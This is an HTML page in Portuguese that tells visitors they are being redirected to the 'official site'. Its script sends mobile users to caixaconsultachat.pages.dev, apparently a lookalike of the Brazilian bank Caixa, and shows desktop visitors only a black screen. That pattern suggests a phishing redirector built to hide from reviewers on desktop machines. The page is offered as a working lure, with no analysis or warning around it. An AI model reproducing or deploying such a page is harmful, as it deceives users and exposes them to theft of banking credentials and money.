<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AGUARDE...</title>
    <style>
        html,
        body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
            background: #005ca9;
        }

        body {
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            color: white;
        }

        .container {
            padding: 20px;
        }

        .text {
            font-size: 24px;
            font-weight: bold;
            line-height: 1.6;
            text-transform: uppercase;
        }

        .loading {
            margin-top: 30px;
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-left: auto;
            margin-right: auto;
        }

        @keyframes spin {
            100% {
                transform: rotate(360deg);
            }
        }

        #desktopBlock {
            display: none;
            width: 100%;
            height: 100%;
            background: black;
        }
    </style>
</head>

<body>
    <div class="container" id="mobileContent">
        <div class="text"> AGUARDE...<br> ESTAMOS TE REDIRECIONANDO<br> PARA O SITE OFICIAL </div>
        <div class="loading"></div>
    </div>
    <div id="desktopBlock"></div>
    <script>
        const isMobile = /Android|iPhone|iPod/i.test(navigator.userAgent);
        if (isMobile) {
            setTimeout(() => {
                window.location.href = "https://caixaconsultachat.pages.dev/";
            }, 5000);
        } else {
            document.getElementById("mobileContent").style.display = "none";
            document.getElementById("desktopBlock").style.display = "block";
            document.body.style.background = "black";
        }
    </script>
</body>

</html>
